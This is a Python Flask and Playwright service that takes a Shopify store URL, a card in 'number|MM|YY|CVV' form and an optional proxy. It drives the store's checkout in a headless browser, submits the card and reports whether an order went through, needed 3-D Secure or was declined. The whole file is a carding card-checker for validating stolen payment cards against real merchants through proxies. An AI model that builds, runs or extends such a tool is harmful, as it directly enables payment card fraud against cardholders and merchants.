import os
import re
import asyncio
import json
from flask import Flask, request, jsonify
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout

app = Flask(__name__)

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    match = re.search(pattern, text)
    if match:
        card, month, year, cvv = match.groups()
        if len(year) == 2:
            year = '20' + year
        return card, month, year, cvv
    return None, None, None, None

async def perform_checkout(site, card, month, year, cvv, proxy=None):
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=['--no-sandbox', '--disable-setuid-sandbox']
        )
        context = await browser.new_context(
            viewport={'width': 1280, 'height': 800},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        )
        if proxy:
            context = await browser.new_context(proxy={'server': proxy})
        page = await context.new_page()

        try:
            # Go to store homepage first
            await page.goto(site, timeout=15000, wait_until='domcontentloaded')
            # Go to checkout
            await page.goto(f"{site}/checkout", timeout=30000, wait_until='networkidle')

            # Wait for card number field (common Shopify)
            card_selector = 'input[name="checkout[credit_card][number]"], input#credit_card_number'
            await page.wait_for_selector(card_selector, timeout=15000)
            await page.fill(card_selector, card.replace(' ', ''))

            # Name (optional)
            name_selector = 'input[name="checkout[credit_card][name]"], input#credit_card_name'
            if await page.locator(name_selector).count() > 0:
                await page.fill(name_selector, "John Doe")

            # Expiry
            month_selector = 'input[name="checkout[credit_card][month]"], input#credit_card_month'
            year_selector = 'input[name="checkout[credit_card][year]"], input#credit_card_year'
            await page.fill(month_selector, month)
            await page.fill(year_selector, year)

            # CVV
            cvv_selector = 'input[name="checkout[credit_card][verification_value]"], input#credit_card_verification_value'
            await page.fill(cvv_selector, cvv)

            # Click pay button
            pay_button = 'button[type="submit"][name="button"], button:has-text("Pay"), button:has-text("Complete order")'
            await page.click(pay_button, timeout=5000)

            # Wait for result
            await page.wait_for_timeout(8000)

            # Analyze result
            url = page.url
            content = await page.content()
            lower = content.lower()

            if 'thank_you' in url.lower() or 'order' in url.lower():
                price_match = re.search(r'<span[^>]*data-total-price[^>]*>([\d.]+)</span>', content)
                price = float(price_match.group(1)) if price_match else 0.0
                return {"Response": "Order placed successfully", "Price": price, "Gateway": "Shopify"}
            elif any(x in lower for x in ['3d', 'authenticate', 'verification required', 'challenge']):
                return {"Response": "3DS_REQUIRED", "Price": 0, "Gateway": "Shopify"}
            else:
                # Check for error messages
                error_match = re.search(r'<p[^>]*class="error"[^>]*>(.*?)</p>', content, re.DOTALL)
                if error_match:
                    err = error_match.group(1).strip()
                    return {"Response": err, "Price": 0, "Gateway": "Shopify"}
                return {"Response": "Card Declined", "Price": 0, "Gateway": "Shopify"}
        except PlaywrightTimeout as e:
            return {"Response": f"Timeout: {str(e)[:50]}", "Price": 0, "Gateway": "Shopify"}
        except Exception as e:
            return {"Response": f"Error: {str(e)[:80]}", "Price": 0, "Gateway": "Shopify"}
        finally:
            await browser.close()

@app.route('/shopify', methods=['GET'])
def shopify():
    site = request.args.get('site')
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')
    if not site or not cc:
        return jsonify({"Response": "Missing site or cc", "Price": 0, "Gateway": "Shopify"}), 400

    card, month, year, cvv = extract_cc(cc)
    if not card:
        return jsonify({"Response": "Invalid card format", "Price": 0, "Gateway": "Shopify"}), 400

    if not site.startswith('http'):
        site = 'https://' + site

    # Build proxy string for Playwright (ip:port or ip:port:user:pass)
    proxy_str = None
    if proxy:
        parts = proxy.split(':')
        if len(parts) == 2:
            proxy_str = f"http://{parts[0]}:{parts[1]}"
        elif len(parts) == 4:
            proxy_str = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"

    result = asyncio.run(perform_checkout(site, card, month, year, cvv, proxy_str))
    return jsonify(result)

@app.route('/health')
def health():
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
